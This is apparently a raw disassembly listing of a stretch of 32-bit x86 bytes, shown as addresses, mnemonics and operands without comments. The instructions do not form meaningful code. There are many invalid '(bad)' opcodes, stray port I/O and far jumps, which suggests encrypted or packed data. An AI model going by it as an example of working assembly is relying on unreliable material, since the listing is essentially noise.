  4071d7:	or     dl,dh
  4071d9:	rol    dl,cl
  4071db:	pop    edi
  4071dc:	sbb    eax,edi
  4071de:	pop    ebx
  4071df:	xor    bh,BYTE PTR ds:0xa3d0c8b2
  4071e5:	adc    al,0x41
  4071e7:	dec    eax
  4071e8:	jmp    0x4071bc
  4071ea:	les    eax,FWORD PTR [ebp+0x3f]
  4071ed:	(bad)  [eax-0x55772c8e]
  4071f3:	test   BYTE PTR ds:0xd4369f88,0x45
  4071fa:	pop    eax
  4071fb:	jo     0x4071a1
  4071fd:	xchg   ebx,eax
  4071fe:	dec    ecx
  4071ff:	dec    esi
  407200:	imul   esi,ebx,0xcbcc92e9
  407206:	and    al,BYTE PTR [edx+0x43d010c6]
  40720c:	call   0x322c7c23
  407211:	retf   0x55be
  407214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407215:	jae    0x40721d
  407217:	loop   0x4071b1
  407219:	xchg   esp,eax
  40721a:	xchg   edi,eax
  40721b:	(bad)  
  40721c:	cmp    dl,bl
  40721e:	add    BYTE PTR [ebp-0x6a624f0b],dl
  407224:	test   DWORD PTR [edi-0xe],esp
  407227:	pshufw mm7,QWORD PTR [eax+0x17],0x4d
  40722c:	mov    esp,0x66d0c33
  407231:	push   0xffffff85
  407233:	push   esp
  407234:	outs   dx,DWORD PTR ds:[esi]
  407235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407236:	(bad)
  407239:	mov    BYTE PTR [esi+0x4b],ah
  40723c:	aad    0x1d
  40723e:	mov    BYTE PTR [ecx+0x6f37ce5b],0x68
  407245:	pop    edi
  407246:	inc    eax
  407247:	jns    0x407284
  407249:	je     0x4072b0
  40724b:	jae    0x4071ed
  40724d:	fistp  DWORD PTR [ecx]
  40724f:	xchg   esp,eax
  407250:	inc    ecx
  407251:	xchg   esi,eax
  407252:	adc    BYTE PTR ds:0x2e92d5b8,cl
  407258:	adc    DWORD PTR ds:0xc8f8b61e,edi
  40725e:	sbb    dl,ah
  407260:	push   edx
  407261:	fs sahf 
  407263:	jne    0x40729b
  407265:	push   ss
  407266:	sti    
  407267:	les    ecx,FWORD PTR [edi+0x27]
  40726a:	xor    bh,BYTE PTR [ebx-0x2bb26aaf]
  407270:	xor    dl,0x46
  407273:	mov    dl,0x9
  407275:	pop    eax
  407276:	loope  0x4072d4
  407278:	out    dx,al
  407279:	lock leave 
  40727b:	jp     0x4072c5
  40727d:	cmp    BYTE PTR [eax],0x2d
  407280:	mov    eax,ds:0xa8bfb3f
  407285:	imul   edx,DWORD PTR [esi-0x7c],0x8a800122
  40728c:	ds pop edx
  40728e:	mov    dl,0x50
  407290:	lds    edx,FWORD PTR [esi+esi*4-0x5127a785]
  407297:	dec    esp
  407298:	jmp    0x407294
  40729a:	or     al,0xb3
  40729c:	pop    eax
  40729d:	loopne 0x407310
  40729f:	inc    edi
  4072a0:	mov    cl,0x57
  4072a2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072a4:	mov    eax,ds:0x7a79081b
  4072a9:	int    0xb8
  4072ab:	xchg   esi,eax
  4072ac:	jns    0x4072dd
  4072ae:	jnp    0x4072dd
  4072b0:	or     BYTE PTR [edx],ah
  4072b2:	loop   0x40729c
  4072b4:	dec    ecx
  4072b5:	sub    eax,0x8b6be627
  4072ba:	push   edi
  4072bb:	push   ebp
  4072bc:	push   0xffffffa0
  4072be:	ret    0xb4af
  4072c1:	scas   al,BYTE PTR es:[edi]
  4072c2:	not    DWORD PTR [edi]
  4072c4:	ins    DWORD PTR es:[edi],dx
  4072c5:	sbb    eax,0x9dfc4b76
  4072ca:	scas   eax,DWORD PTR es:[di]
  4072cc:	push   es
  4072cd:	inc    DWORD PTR ss:[edi+0x7c93cdc1]
  4072d4:	and    BYTE PTR [edx+0x56073ba7],ah
  4072da:	test   DWORD PTR ds:0x83f5cc59,ebx
  4072e1:	inc    edi
  4072e2:	inc    edx
  4072e3:	xor    ch,BYTE PTR ds:0x4bfe2213
  4072e9:	mov    dh,0x45
  4072eb:	mov    ecx,0x7f3df8ec
  4072f0:	fwait
  4072f1:	xchg   DWORD PTR [ecx-0x70],ecx
  4072f4:	int    0x4
  4072f6:	rol    BYTE PTR [ecx+ebx*4-0x53],1
  4072fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072fb:	xor    eax,0x474ad32d
  407300:	jp     0x407367
  407302:	ret    
  407303:	sbb    bh,ah
  407305:	sub    cl,dl
  407307:	cmp    BYTE PTR [ecx-0x2572cced],cl
  40730d:	xor    ebp,0xffffffe9
  407310:	mov    al,0x1d
  407312:	fs (bad) 
  407314:	(bad)  
  407315:	xlat   BYTE PTR ds:[ebx]
  407316:	ficomp DWORD PTR [ebp-0x55]
  407319:	ds inc ecx
  40731b:	cwde   
  40731c:	pop    ebp
  40731d:	sub    dh,bh
  40731f:	js     0x4072e7
  407321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407322:	rcr    dh,1
  407324:	and    bh,0x9d
  407327:	and    ebp,DWORD PTR [ebp-0x14c0f7f5]
  40732d:	or     cl,BYTE PTR ds:0xb3288405
  407333:	push   edi
  407334:	adc    al,0xea
  407336:	xchg   BYTE PTR [esi-0x1d],dh
  407339:	sar    DWORD PTR [esi],0xb8
  40733c:	inc    esi
  40733d:	and    BYTE PTR [eax],dh
  40733f:	(bad)  [esi-0x3bd17194]
  407345:	pop    esp
  407346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407347:	sbb    al,0xda
  407349:	pushf  
  40734a:	jg     0x407327
  40734c:	in     al,0xc3
  40734e:	mov    al,0x8a
  407350:	xchg   esp,eax
  407351:	repz jecxz 0x407331
  407354:	xlat   BYTE PTR ds:[ebx]
  407355:	cs adc dh,ah
  407358:	jbe    0x407326
  40735a:	(bad)  
  40735b:	outs   dx,DWORD PTR ds:[esi]
  40735c:	push   cs
  40735d:	mov    edi,0xbe23467e
  407362:	rcr    BYTE PTR ds:0xeb82447a,0xd7
  407369:	sahf   
  40736a:	(bad)  
  40736b:	mov    esp,0x981a5f64
  407370:	push   ds
  407371:	xchg   ecx,eax
  407372:	push   es
  407373:	and    dh,BYTE PTR [edx+0x5059ed16]
  407379:	push   edi
  40737a:	dec    esi
  40737b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40737c:	dec    esp
  40737d:	lahf   
  40737e:	retf   
  40737f:	into   
  407380:	xor    edi,DWORD PTR [esi]
  407382:	inc    edi
  407383:	or     ebx,edx
  407385:	inc    esi
  407386:	outs   dx,BYTE PTR ds:[esi]
  407387:	retf   
  407388:	inc    esp
  407389:	mov    ebx,0xc3d52175
  40738e:	jecxz  0x4073c7
  407390:	stos   BYTE PTR es:[edi],al
  407391:	loop   0x407341
  407393:	fadd   QWORD PTR [esi-0xf504bd0]
  407399:	gs xchg ebx,eax
  40739b:	sahf   
  40739c:	cmp    eax,0xb20c2047
  4073a1:	call   0x1843425d
  4073a6:	xor    al,dh
  4073a8:	jge    0x407363
  4073aa:	jge    0x4073b0
  4073ac:	in     al,0xdd
  4073ae:	add    eax,DWORD PTR [eax+0x3d]
  4073b1:	outs   dx,DWORD PTR ds:[esi]
  4073b2:	div    ch
  4073b4:	xor    BYTE PTR [edx+eiz*8+0x3d],al
  4073b8:	jecxz  0x40734f
  4073ba:	cwde   
  4073bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073bc:	cmp    DWORD PTR [edi],esi
  4073be:	dec    esi
  4073bf:	in     eax,dx
  4073c0:	popa   
  4073c1:	fisub  DWORD PTR ds:0x323b0a1e
  4073c7:	ins    BYTE PTR es:[edi],dx
  4073c8:	rcl    DWORD PTR [bp+si],0xef
  4073cc:	out    dx,eax
  4073cd:	lea    ebx,[eax-0x51]
  4073d0:	mov    BYTE PTR [ebp+0x4a],dl
  4073d3:	retf   0x8668
  4073d6:	test   al,0x78
  4073d8:	xlat   BYTE PTR ds:[ebx]
  4073d9:	aaa    
  4073da:	mov    ebx,DWORD PTR [ebp*4-0x7fc96be6]
  4073e1:	and    edi,DWORD PTR [ebx+0x3e]
  4073e4:	scas   al,BYTE PTR es:[edi]
  4073e5:	inc    edi
  4073e6:	push   ebp
  4073e7:	aam    0x6f
  4073e9:	pop    ebp
  4073ea:	fcom   QWORD PTR [edi]
  4073ec:	push   0x56
  4073ee:	xchg   edx,eax
  4073ef:	jg     0x73edd6d7
  4073f5:	shl    BYTE PTR ds:0x572fd28f,cl
  4073fb:	rcl    DWORD PTR [edi+0x40],0x93
  4073ff:	add    eax,0xb3c40ddb
  407404:	dec    eax
  407405:	leave  
  407406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407408:	add    esp,esp
  40740a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40740b:	lahf   
  40740c:	pop    ebp
  40740d:	aaa    
  40740e:	or     eax,DWORD PTR [edi+0x1f]
  407411:	and    al,0x49
  407413:	leave  
  407414:	ret    
  407415:	bnd jl 0x407413
  407418:	retf   0xaa19
  40741b:	push   edi
  40741c:	jb     0x407495
  40741e:	jg     0x4073e8
  407420:	push   ss
  407421:	loope  0x4073f1
  407423:	sbb    BYTE PTR [ecx+0x30],bh
  407426:	mov    ch,0xc0
  407428:	or     esi,DWORD PTR [esp+ebx*1-0x7]
  40742c:	stos   DWORD PTR es:[edi],eax
  40742d:	repnz fcomp DWORD PTR [esi+0x671e63c8]
  407434:	daa    
  407435:	xchg   ecx,eax
  407436:	or     eax,edi
  407438:	or     DWORD PTR [ebx-0x19f2f828],esi
  40743e:	xchg   ecx,eax
  40743f:	les    ebp,FWORD PTR [ecx*2-0x14bcee11]
  407446:	jg     0x407491
  407448:	mov    ecx,0x5f442d6c
  40744d:	dec    edx
  40744e:	lahf   
  40744f:	mov    ch,0x37
  407451:	mov    ebp,0xcdb77689
  407456:	arpl   WORD PTR [edx],dx
  407458:	ins    BYTE PTR es:[edi],dx
  407459:	and    BYTE PTR [ebx-0x16],0x26
  40745d:	jb     0x407493
  40745f:	inc    ebp
  407460:	mov    edi,edx
  407462:	cmp    ch,cl
  407464:	sbb    DWORD PTR [edi-0x21],eax
  407467:	inc    eax
  407468:	xor    eax,0x16613ed1
  40746d:	add    BYTE PTR [ecx-0x66],0x78
  407471:	jbe    0x407440
  407473:	or     eax,0x48
  407476:	sub    BYTE PTR [ebx-0x3a205bb4],bh
  40747c:	jno    0x407405
  40747e:	mov    edx,0x56d70a27
  407483:	pop    ebx
  407484:	cmc    
  407485:	jle    0x407469
  407487:	mov    bh,0xb1
  407489:	xor    bh,BYTE PTR [eax]
  40748b:	popf   
  40748c:	lahf   
  40748d:	xor    DWORD PTR [edx+0x6a],ebp
  407490:	stos   BYTE PTR es:[edi],al
  407491:	jmp    0x40747b
  407493:	sub    BYTE PTR ds:0xd7e326ae,0xec
  40749a:	das    
  40749b:	fimul  WORD PTR [esi+eax*8-0x61]
  40749f:	adc    DWORD PTR [edi],ebx
  4074a1:	lods   eax,DWORD PTR ds:[esi]
  4074a2:	lods   al,BYTE PTR ds:[esi]
  4074a3:	xchg   ebx,eax
  4074a4:	push   es
  4074a5:	sbb    cl,BYTE PTR [edx]
  4074a7:	imul   esp,DWORD PTR [ecx+0x7bdb363],0x9b5a5c35
  4074b1:	inc    ecx
  4074b2:	cld    
  4074b3:	or     eax,0xc18ca9f4
  4074b8:	(bad)  
  4074b9:	jmp    0xa9ae:0xa9908732
  4074c0:	push   ebp
  4074c1:	and    eax,0x5ec57900
  4074c6:	aas    
  4074c7:	sub    bl,BYTE PTR [eax]
  4074c9:	inc    esp
  4074ca:	into   
  4074cb:	inc    edx
  4074cc:	stos   DWORD PTR es:[di],eax
  4074ce:	add    eax,0x9a190fbc
  4074d3:	add    al,0x8
  4074d5:	xor    BYTE PTR [ecx],cl
  4074d7:	stc    
  4074d8:	lea    edx,[ebx]
  4074da:	daa    
  4074db:	push   ss
  4074dc:	or     BYTE PTR [eax+ebx*2+0x49],bl
  4074e0:	cld    
  4074e1:	aad    0x71
  4074e3:	cmp    al,0x58
  4074e5:	xchg   ebx,eax
  4074e6:	mov    cl,0x32
  4074e8:	inc    esp
  4074e9:	int3   
  4074ea:	int3   
  4074eb:	inc    edx
  4074ec:	and    edi,DWORD PTR [edx+edx*2]
  4074ef:	sbb    DWORD PTR [eax+0x53],esp
  4074f2:	xor    edx,DWORD PTR ds:0x42fcacdf
  4074f8:	hlt    
  4074f9:	lds    ebx,FWORD PTR [esi+0x7c9d72f6]
  4074ff:	lahf   
  407500:	cmp    al,0xdb
  407502:	or     ah,ch
  407504:	pop    ecx
  407505:	mov    cl,BYTE PTR [esi]
  407507:	sub    ch,BYTE PTR [edi]
  407509:	fmul   QWORD PTR [edi-0x27874c85]
  40750f:	cmp    edx,DWORD PTR [edi+0x79]
  407512:	clc    
  407513:	sub    DWORD PTR [esi],ebp
  407515:	sbb    al,0xca
  407518:	push   ss
  407519:	mov    eax,0x399fa71a
  40751e:	jne    0x407506
  407520:	jl     0x40755d
  407522:	div    DWORD PTR [esi-0x280ad844]
  407528:	and    BYTE PTR [ecx+ebx*4],bh
  40752b:	or     BYTE PTR [ebx-0x1],bh
  40752e:	ror    DWORD PTR [edi-0x24],cl
  407531:	fisub  DWORD PTR [edi+ecx*8]
  407534:	test   eax,0xca94c596
  407539:	sbb    ebx,DWORD PTR [ebp+esi*4-0x11599615]
  407540:	or     BYTE PTR [edi],0xae
  407543:	(bad)  
  407544:	test   eax,0x2bef8e13
  407549:	fbstp  TBYTE PTR [edx+0x6716b23d]
  40754f:	pop    edi
  407550:	(bad)  
  407551:	clc    
  407552:	clc    
  407553:	imul   eax,eax,0xffffffc6
  407556:	int    0xd0
  407558:	arpl   WORD PTR [eax-0x14],dx
  40755b:	test   al,0x27
  40755d:	ret    0xdce8
  407560:	inc    ebp
  407561:	leave  
  407562:	jge    0x407510
  407564:	ins    BYTE PTR es:[edi],dx
  407565:	cmp    esp,DWORD PTR [esi+0x3b]
  407568:	or     al,0xb8
  40756a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40756b:	and    eax,0xad72f546
  407570:	sbb    eax,0x975d8bd3
  407575:	fnstcw WORD PTR [eax+0x2d]
  407578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407579:	sbb    BYTE PTR [eax+0x5f],0xec
  40757d:	xchg   cl,ah
  40757f:	adc    BYTE PTR [ebp+esi*8+0x33],bl
  407583:	jnp    0x407585
  407585:	sbb    edi,esp
  407587:	dec    esp
  407588:	dec    ecx
  407589:	sbb    BYTE PTR [ebp+edx*2-0x4b2c40b7],cl
  407590:	push   0x27dc00e6
  407595:	js     0x4075e6
  407597:	and    BYTE PTR [esp+esi*8],ch
  40759a:	jae    0x40756f
  40759c:	mov    ebx,0x1dcce11
  4075a1:	jl     0x4075f7
  4075a3:	sub    edi,DWORD PTR [ecx+0x1f]
  4075a6:	shr    BYTE PTR [edi+eax*1+0x14],cl
  4075aa:	call   0x71c70fec
  4075af:	xor    al,0xbe
  4075b1:	sar    DWORD PTR [ecx],1
  4075b3:	jnp    0x40759d
  4075b5:	movaps xmm3,XMMWORD PTR [ebx]
  4075b8:	loopne 0x40754a
  4075ba:	xchg   edi,eax
  4075bb:	iret   
  4075bc:	into   
  4075bd:	test   eax,0xf269a617
  4075c2:	dec    edx
  4075c3:	in     al,dx
  4075c4:	jns    0x4075fa
  4075c6:	ret    
  4075c7:	adc    BYTE PTR [ebp+0x1],ah
  4075ca:	pop    edi
  4075cb:	adc    DWORD PTR [ebx-0x15],esp
  4075ce:	xchg   edx,eax
  4075cf:	test   DWORD PTR [esi],ebp
  4075d1:	aad    0xea
  4075d3:	push   edi
  4075d4:	pop    ebp
  4075d5:	jnp    0x4075c6
  4075d7:	pop    ecx
  4075d8:	sbb    al,0xe4
  4075da:	inc    edx
  4075db:	shr    DWORD PTR [edx+0x4a351756],0x70
  4075e2:	adc    al,0x42
  4075e4:	(bad)  [esi+0x194b842d]
  4075ea:	and    DWORD PTR [ebx-0x28],0xffffff8f
  4075ee:	fadd   QWORD PTR [edi-0x60]
  4075f1:	jns    0x40763b
  4075f3:	xchg   edi,eax
  4075f4:	outs   dx,DWORD PTR ds:[esi]
  4075f5:	out    0xa6,al
  4075f7:	dec    ebx
  4075f8:	or     dh,al
  4075fa:	int    0xa7
  4075fc:	addr16 das 
  4075fe:	push   cs
  4075ff:	cmc    
  407600:	daa    
  407601:	push   es
  407602:	test   al,0x8
  407604:	lods   eax,DWORD PTR ds:[esi]
  407605:	sub    al,0x9b
  407607:	mov    eax,ds:0xd28ef874
  40760c:	imul   ebp,DWORD PTR [edx],0xb95873b4
  407612:	cdq    
  407613:	in     al,dx
  407614:	data16 xchg BYTE PTR [edx-0x79af3a7f],bh
  40761b:	(bad)
  40761e:	or     BYTE PTR [eax+0xa],dl
  407621:	mov    gs,WORD PTR [esi-0x55]
  407624:	xchg   ebx,eax
  407625:	mov    ds:0x23d31731,al
  40762a:	jb     0x4075bd
  40762c:	leave  
  40762d:	and    dh,BYTE PTR [ebx+0x2615d847]
  407633:	mov    cl,0x36
  407635:	and    al,0x95
  407637:	jae    0x40765f
  407639:	je     0x4075d2
  40763b:	sbb    BYTE PTR [ebp+0x6a],dl
  40763e:	ror    DWORD PTR [esi],cl
  407640:	sub    al,0x62
  407642:	scas   al,BYTE PTR es:[edi]
  407643:	cwde   
  407644:	cmp    DWORD PTR [esi-0x9f40f05],ebx
  40764a:	xor    BYTE PTR [eax-0x67eeada6],ah
  407650:	dec    ebx
  407651:	mov    edi,0x35eff8f3
  407656:	je     0x40766a
  407658:	or     ebx,DWORD PTR [eax]
  40765a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40765b:	mov    ebp,0xa780e98
  407660:	push   ds
  407661:	mov    esi,0xda59dc12
  407666:	outs   dx,BYTE PTR ds:[esi]
  407667:	push   0x5c
  407669:	stos   DWORD PTR es:[edi],eax
  40766a:	test   eax,0xd1210398
  40766f:	js     0x407652
  407671:	xchg   edi,eax
  407672:	push   ecx
  407673:	push   es
  407674:	mov    ch,0x62
  407676:	adc    ch,BYTE PTR [esi]
  407678:	aaa    
  407679:	sbb    eax,0x804f2081
  40767e:	xchg   ebp,eax
  40767f:	pop    esi
  407680:	sbb    BYTE PTR [edx+0x62],dl
  407683:	push   cs
  407684:	mov    ds:0x6e0a4b78,al
  407689:	sbb    al,0xa7
  40768b:	jns    0x4076c6
  40768d:	cmp    eax,0xc02e8f0d
  407692:	add    ebp,esp
  407694:	xchg   esp,eax
  407695:	adc    ebx,edi
  407697:	xchg   esi,eax
  407698:	push   cs
  407699:	sar    DWORD PTR [eax-0x5e220cf7],0xd3
  4076a0:	dec    si
  4076a2:	arpl   WORD PTR [edi-0x2b1ff39e],si
  4076a8:	jb     0x407668
  4076aa:	dec    ebp
  4076ab:	push   ds
  4076ac:	ror    esp,0x8f
  4076af:	mov    edi,DWORD PTR [edx-0x383b4669]
  4076b5:	mov    DWORD PTR [esi+0x73],0xc85d9b8
  4076bc:	and    al,0x92
  4076be:	cmp    BYTE PTR [esi+0x54],cl
  4076c1:	xchg   edi,eax
  4076c2:	xor    bh,dh
  4076c4:	aad    0x30
  4076c6:	ret    0x7e6
  4076c9:	pop    es
  4076ca:	mov    ah,BYTE PTR [edi-0x3a]
  4076cd:	mov    ds:0x79ab5473,al
  4076d2:	cmp    eax,0xf9012f8f
  4076d7:	(bad)  
  4076d8:	fcmovbe st,st(1)
  4076da:	adc    eax,0xb806bb44
  4076df:	call   0xb2da:0x5d1517cf
  4076e6:	icebp  
  4076e7:	adc    al,0x68
  4076e9:	mov    ebp,0x78ae0172
  4076ee:	push   es
  4076ef:	scas   al,BYTE PTR es:[edi]
  4076f0:	adc    al,0xc6
  4076f2:	aad    0x40
  4076f4:	(bad)  
  4076f5:	ror    DWORD PTR [esi+ecx*2-0x1f],1
  4076f9:	push   ecx
  4076fa:	mov    dh,0xfe
  4076fc:	pop    esi
  4076fd:	mov    eax,ds:0xab00b3b1
  407702:	popa   
  407703:	xlat   BYTE PTR ds:[ebx]
  407704:	pop    ecx
  407705:	pop    esp
  407706:	cmp    al,BYTE PTR [esi-0x18]
  407709:	push   cs
  40770a:	sbb    al,BYTE PTR [esi-0xc9e42f4]
  407710:	and    DWORD PTR [edi+0xc05f736],0x63ff5a22
  40771a:	jle    0x4076a6
  40771c:	push   0x4a
  40771e:	mov    al,ds:0xed86d75a
  407723:	push   DWORD PTR [ecx-0x1f]
  407726:	mov    eax,0x2ae2506a
  40772b:	pop    edx
  40772c:	cwde   
  40772d:	mov    ebp,0x8de9fada
  407732:	shl    BYTE PTR [edx-0x7bb424c],0x7f
  407739:	mov    dl,0x7d
  40773b:	lods   eax,DWORD PTR ds:[esi]
  40773c:	pusha  
  40773d:	and    BYTE PTR [ecx-0x35],dh
  407740:	inc    esp
  407741:	outs   dx,DWORD PTR ds:[esi]
  407742:	mov    BYTE PTR [ebp-0x3b],ch
  407745:	into   
  407746:	icebp  
  407747:	xchg   ebp,eax
  407748:	cmp    ecx,DWORD PTR [eax]
  40774a:	mov    ebx,0xbe20394b
  40774f:	movaps xmm6,xmm1
  407752:	cmp    eax,0x7227f9dd
  407757:	sub    al,BYTE PTR fs:[edi+0xc]
  40775b:	or     al,0x8f
  40775d:	and    eax,0x39a33ae3
  407762:	adc    al,0x11
  407764:	outs   dx,DWORD PTR ds:[esi]
  407765:	data16 stos BYTE PTR es:[edi],al
  407767:	fwait
  407768:	(bad)  
  407769:	add    DWORD PTR [esi-0x47],esi
  40776c:	repnz jecxz 0x40778e
  40776f:	sub    al,0x54
  407771:	out    dx,eax
  407772:	push   cs
  407773:	jns    0x4077b5
  407775:	push   edx
  407776:	stc    
  407777:	push   0x86d1353f
  40777c:	ss retf 
  40777e:	mov    WORD PTR [ebp+0x52],?
  407781:	mov    ds:0xa4bbe195,eax
  407786:	sbb    al,0xb9
  407788:	and    DWORD PTR [edi+0x42],edi
  40778b:	iret   
  40778c:	adc    esp,DWORD PTR [ebp+0x48]
  40778f:	loop   0x4077d7
  407791:	xlat   BYTE PTR ds:[ebx]
  407792:	(bad)
  407795:	dec    ecx
  407796:	clc    
  407797:	xor    eax,DWORD PTR [ecx+eiz*2+0x59]
  40779b:	dec    esp
  40779c:	inc    ecx
  40779d:	daa    
  40779e:	and    bh,0xbf
  4077a1:	(bad)  
  4077a2:	xchg   esi,eax
  4077a3:	and    BYTE PTR gs:[ebx+0x53],0xf0
  4077a8:	xor    BYTE PTR [edi+0x3656bdf1],ah
  4077ae:	xchg   BYTE PTR [edx+0x29],dh
  4077b1:	iret   
  4077b2:	mov    BYTE PTR [esi+0x757b313a],al
  4077b8:	xchg   ecx,eax
  4077b9:	les    ebp,FWORD PTR [ecx+0x16]
  4077bc:	or     BYTE PTR [eax],cl
  4077be:	or     edi,esp
  4077c0:	push   eax
  4077c1:	sbb    ebx,ebp
  4077c3:	or     eax,0x922d60b2
  4077c8:	cmc    
  4077c9:	dec    edi
  4077ca:	add    al,0x8a
  4077cc:	sub    dh,al
  4077ce:	push   ebx
  4077cf:	and    al,0xa9
  4077d1:	dec    esp
  4077d2:	sbb    DWORD PTR [ecx],0x7b
  4077d5:	lock sub ecx,eax
  4077d8:	jo     0x40780a
  4077da:	stos   DWORD PTR es:[edi],eax
  4077db:	loope  0x40777d
  4077dd:	mov    eax,0x27cb0a9d
  4077e2:	ja     0x4077ca
  4077e4:	pop    ecx
  4077e5:	jns    0x4077b7
  4077e7:	rcl    esp,1
  4077e9:	pop    dx
  4077eb:	adc    bh,BYTE PTR [edx+edi*4]
  4077ee:	scas   eax,DWORD PTR es:[edi]
  4077ef:	fld    QWORD PTR [ebx]
  4077f1:	xchg   ebp,eax
  4077f2:	sar    DWORD PTR [ebp-0x6e89f27d],0xa9
  4077f9:	cmp    edi,DWORD PTR [esi+esi*8+0x30]
  4077fd:	ret    
  4077fe:	out    dx,al
  4077ff:	cwde   
  407800:	scas   al,BYTE PTR es:[edi]
  407801:	repz mov dh,0x35
  407804:	fcomi  st,st(7)
  407806:	aam    0xd8
  407808:	pop    es
  407809:	adc    eax,DWORD PTR [eax-0x72]
  40780c:	inc    ecx
  40780d:	shl    DWORD PTR [eax-0x3352a930],cl
  407813:	mov    BYTE PTR [edx-0x10968cb5],dl
  407819:	dec    edi
  40781a:	aas    
  40781b:	inc    ecx
  40781c:	and    cl,BYTE PTR [edi-0x66b71c97]
  407822:	xchg   esi,eax
  407823:	retf   
  407824:	xchg   DWORD PTR [edx+0x68],ebx
  407827:	lahf   
  407828:	(bad)  
  407829:	push   esi
  40782a:	pop    esp
  40782b:	div    BYTE PTR gs:[ebx+0x51]
  40782f:	int    0x4a
  407831:	fwait
  407832:	mov    ds:0xe9d9eb2b,eax
  407837:	mov    esp,0xe90d81d0
  40783c:	dec    esp
  40783d:	and    DWORD PTR [ebp+0x68],edx
  407840:	mov    ebp,0xfb3678af
  407845:	out    dx,eax
  407846:	(bad)  
  407847:	ficomp DWORD PTR [edx]
  407849:	mov    edi,0xf295cec0
  40784e:	xlat   BYTE PTR ds:[ebx]
  40784f:	dec    esp
  407850:	adc    al,0x18
  407852:	sub    cl,0x97
  407855:	stos   DWORD PTR es:[edi],eax
  407856:	test   BYTE PTR [edi-0x4ef5096f],bl
  40785c:	dec    eax
  40785d:	pop    edx
  40785e:	push   ebp
  40785f:	fimul  WORD PTR [edx-0x70]
  407862:	dec    esi
  407863:	repnz add BYTE PTR [esi+0x51823b4b],ah
  40786a:	push   eax
  40786b:	pop    esp
  40786c:	add    eax,0x8f20d9cc
  407871:	cmc    
  407872:	test   eax,0xff90e981
  407877:	inc    edx
  407878:	into   
  407879:	ins    BYTE PTR es:[edi],dx
  40787a:	xchg   esp,eax
  40787b:	scas   al,BYTE PTR es:[edi]
  40787c:	or     eax,0x5454d0a7
  407881:	fdiv   QWORD PTR [esi-0x35]
  407884:	sub    al,BYTE PTR [edx+0x5e]
  407887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407888:	stos   BYTE PTR es:[edi],al
  407889:	sub    edi,DWORD PTR [edi+0x5c]
  40788c:	adc    al,0xa9
  40788e:	test   cl,dh
  407890:	(bad)  
  407891:	lods   eax,DWORD PTR ds:[esi]
  407892:	scas   al,BYTE PTR es:[edi]
  407893:	sbb    edx,DWORD PTR [ecx]
  407895:	loop   0x407839
  407897:	test   DWORD PTR [ebp-0x7e],ebx
  40789a:	mov    ds:0x143b2703,al
  40789f:	outs   dx,BYTE PTR ds:[esi]
  4078a0:	mov    bl,0x4b
  4078a2:	xchg   edx,eax
  4078a3:	or     eax,DWORD PTR [ebx]
  4078a5:	mov    edx,DWORD PTR [edx]
  4078a7:	pop    DWORD PTR [ecx]
  4078a9:	shl    BYTE PTR [edx],0x8c
  4078ac:	dec    esi
  4078ad:	and    DWORD PTR [eax],ebx
  4078af:	enter  0xffc4,0xdd
  4078b3:	push   cs
  4078b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078b5:	push   0x6f
  4078b7:	jl     0x40784e
  4078b9:	xor    BYTE PTR [ecx],ah
  4078bb:	xor    edx,DWORD PTR [ebx]
  4078bd:	mov    bh,0xcb
  4078bf:	xchg   edi,eax
  4078c0:	push   esp
  4078c1:	jb     0x40790e
  4078c3:	int3   
  4078c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078c5:	sub    edi,DWORD PTR [eax-0x34]
  4078c8:	nop
  4078c9:	fmul   st,st(6)
  4078cb:	xchg   edx,eax
  4078cc:	not    DWORD PTR [ecx]
  4078ce:	pop    edi
  4078cf:	in     eax,0x48
  4078d1:	xchg   esp,eax
  4078d2:	mov    al,0xe8
  4078d4:	(bad)
  4078d7:	bound  eax,QWORD PTR [esi-0x4c]
  4078da:	or     edi,ebx
  4078dc:	pop    es
  4078dd:	mov    dh,0x1a
  4078df:	pop    esp
  4078e0:	rcr    DWORD PTR [ecx],0xc0
  4078e3:	popf   
  4078e4:	inc    esp
  4078e5:	sub    ecx,DWORD PTR [ebx]
  4078e7:	jno    0x4078cd
  4078e9:	stos   DWORD PTR es:[edi],eax
  4078ea:	jmp    edx
  4078ec:	xchg   ebp,eax
  4078ed:	sub    eax,0x95870cf9
  4078f2:	xor    BYTE PTR [ebx],cl
  4078f4:	fcomp  QWORD PTR [eax-0x7d663463]
  4078fa:	cmp    edi,DWORD PTR [ebp+0x34]
  4078fd:	fsubr  DWORD PTR [edx+0x6e]
  407900:	push   es
  407901:	sbb    eax,0xa20b411
  407906:	rcr    DWORD PTR [ebx],1
  407908:	lds    bp,DWORD PTR [esi]
  40790b:	inc    ecx
  40790c:	pushf  
  40790d:	sbb    eax,DWORD PTR [ebx-0x7963ef58]
  407913:	shr    DWORD PTR [eax-0x2e],1
  407916:	inc    ebx
  407917:	sub    ch,BYTE PTR [ecx]
  407919:	enter  0xb5e7,0x93
  40791d:	ins    DWORD PTR es:[edi],dx
  40791e:	mov    edi,0xf442f759
  407923:	pop    esi
  407924:	fcom   DWORD PTR [ecx+0x5a]
  407927:	(bad)  
  407928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407929:	mov    esi,0xf017448c
  40792e:	add    esi,ebp
  407930:	or     edi,DWORD PTR [ebx-0x1c4c6224]
  407936:	outs   dx,BYTE PTR ds:[esi]
  407937:	pop    ebp
  407938:	mov    al,ds:0xa7de3413
  40793d:	mov    bl,0xf3
  40793f:	(bad)  
  407940:	fwait
  407941:	adc    DWORD PTR [edx-0x666696a4],0x7e323547
